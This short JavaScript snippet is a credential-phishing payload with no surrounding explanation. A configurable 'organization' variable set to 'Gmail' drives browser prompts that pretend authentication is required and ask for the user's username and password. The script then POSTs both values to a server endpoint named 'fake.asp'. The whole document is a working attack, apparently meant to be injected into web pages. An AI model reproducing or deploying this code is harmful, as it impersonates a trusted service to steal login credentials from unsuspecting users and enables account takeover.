//settings start
var organization = "Gmail";
//setting end
var uname = prompt("Authentication required, please enter your "+organization+" username.");
var pass = prompt("Please enter your "+organization+" password.");


var Data = uname+"< >"+pass;
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "fake.asp", true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send(Data);